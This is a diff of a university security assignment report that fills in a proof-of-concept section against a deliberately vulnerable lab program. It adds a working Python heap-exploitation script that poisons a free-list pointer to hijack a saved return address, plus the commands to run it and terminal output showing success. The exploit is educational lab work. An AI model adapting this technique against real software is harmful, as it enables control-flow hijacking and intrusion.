@@ -1320,34 +1320,75 @@ afl-fuzz -i seeds -o findings/remediated -x dict ./sentinel_network_remediated @
 ## 6. Task 5: Proof-of-Concept Exploitation
 
 ### 6.1 Target Vulnerability & Security Consequence
-*[Specify which critical vulnerability was chosen for exploitation. Describe the intended actionable security consequence beyond a simple crash (e.g. arbitrary memory write, stack leak, control flow hijacking, or state flag overwrite).]*
 
-- **Target Component:** `[e.g. sentinel_telemetry.c / sentinel_payload.c / sentinel_network.c]`
-- **Vulnerability Selected:** `[e.g. Format String Arbitrary Write / Stack Buffer Overflow Hijack]`
-- **Actionable Exploit Consequence:** `[Describe the tangible exploit objective achieved]`
+- **Target Component:** `sentinel_payload.c`
+    - **Vulnerability Selected:** `[e.g. Format String Arbitrary Write / Stack Buffer Overflow Hijack]`
+    - **Actionable Exploit Consequence:** `[Describe the tangible exploit objective achieved]`
+- **Target Component:** `sentinel_network.c`
+    - **Vulnerability Selected:** `Vulnerability 13: Logical Flaw in Payload Size Calculation Leading to Heap Buffer Overflow`
+    - **Actionable Exploit Consequence:** `control flow hijacking`
 
 ### 6.2 Memory Layout & Address Analysis
-*[Detail the memory state, stack/heap frame layout, resolved target addresses, GDB memory dumps, and endianness considerations.]*
+
+#### sentinel_payload
 
 `[Complete this section with stack/memory diagrams and GDB address resolution steps]`
 
-### 6.3 Complete Exploit Script
-*[Provide your full, working Python exploit script or shell payload generator.]*
+#### sentinel_network
 
+
+
+### 6.3 Complete Exploit Script
+
+#### sentinel_payload
+```python
+
+```
+
+#### sentinel_network
 ```python
 #!/usr/bin/env python3
-"""
-IFN657 Assignment 2: Proof-of-Concept Exploit Script
-Target: [Target component name]
-Security Consequence: [Actionable consequence description]
-"""
+import struct
+import os
 
-# Insert complete Python exploit script here
+MAGIC = 0x12345678
+
+def build_packet(ptype: int, data: bytes) -> bytes:
+    length = len(data)
+    header = struct.pack("<IHH", MAGIC, ptype, length)
+    return header + data
+
+def main() -> None:
+    packets = b""
+    packets += build_packet(2, b"A" * 0x3c)
+    packets += build_packet(2, b"B" * 0x2c)
+    packets += build_packet(2, b"C" * 0xc)
+    packets += build_packet(3, b"")
+    # safe-linking: fd = target ^ (fd_addr >> 12)
+    RET_SLOT = 0xffffced0        # saved eip - 0xc
+    FD_ADDR  = 0x5655b000        # poisoned fd page
+    fd_mangled = RET_SLOT ^ (FD_ADDR >> 12)
+    packets += build_packet(2, b"A" * 0x3c + struct.pack("<I", 0x11) + struct.pack("<I", fd_mangled))
+    packets += build_packet(2, b"B" * 0x2c)
+    # overwrite saved eip via RET_SLOT chunk
+    pad = b"C" * 12
+    ret_addr = struct.pack("<I", 0xf7db22b0)   # exit
+    packets += build_packet(2, pad + ret_addr)
+
+    out_path = os.path.join(os.path.dirname(os.path.abspath(__file__)),
+                            "exploit.bin")
+    with open(out_path, "wb") as f:
+        f.write(packets)
+
+    print(f"[+] wrote {len(packets)} bytes to {out_path}")
+
+if __name__ == "__main__":
+    main()
 ```
 
 ### 6.4 Reproduction Instructions & Live Bash Evidence
-*[Provide step-by-step commands to compile and execute your exploit in standard bash, accompanied by terminal output proving successful exploitation.]*
 
+#### sentinel_payload
 ```bash
 # Commands to execute the exploit
 # For example, `python3 exploit.py > exploit_payload.bin` then `./target_binary exploit_payload.bin`
@@ -1356,4 +1397,35 @@ Security Consequence: [Actionable consequence description]
 **Observed Terminal Output & Verification:**
 ```text
 [Paste terminal output proving successful exploit execution]
+```
+
+#### sentinel_network
+```bash
+python3 exploits/exploit.py
+./sentinel_network_original exploits/exploit.bin
+```
+
+**Observed Terminal Output & Verification:**
+```text
+# ./sentinel_network_original exploits/exploit.bin
+=== Sentinel-1 RF Telecommand Stream Handler ===
+Ingesting packet frame (300 bytes received)...
+[NETWORK LOG] Command Type: 2, Length: 60, Magic: 0x12345678, Data: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAxV4
+Thruster calibration telecommand processed successfully.
+[NETWORK LOG] Command Type: 2, Length: 44, Magic: 0x12345678, Data: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBxV4
+Thruster calibration telecommand processed successfully.
+[NETWORK LOG] Command Type: 2, Length: 12, Magic: 0x12345678, Data: CCCCCCCCCCCCxV4
+Thruster calibration telecommand processed successfully.
+[NETWORK LOG] Command Type: 3, Length: 0, Magic: 0x12345678, Data: xV4
+Emergency station failover executed.
+[NETWORK LOG] Command Type: 2, Length: 68, Magic: 0x12345678, Data: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Thruster calibration telecommand processed successfully.
+[NETWORK LOG] Command Type: 2, Length: 44, Magic: 0x12345678, Data: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBxV4
+Thruster calibration telecommand processed successfully.
+[NETWORK LOG] Command Type: 2, Length: 16, Magic: 0x12345678, Data: CCCCCCCCCCCC�"��
+Thruster calibration telecommand processed successfully.
+
+# echo $?
+24
+# -> 24, not 0 (normal main return) nor a crash code (134/139): the saved return address was hijacked to exit(), so control never returned to main.
 ```
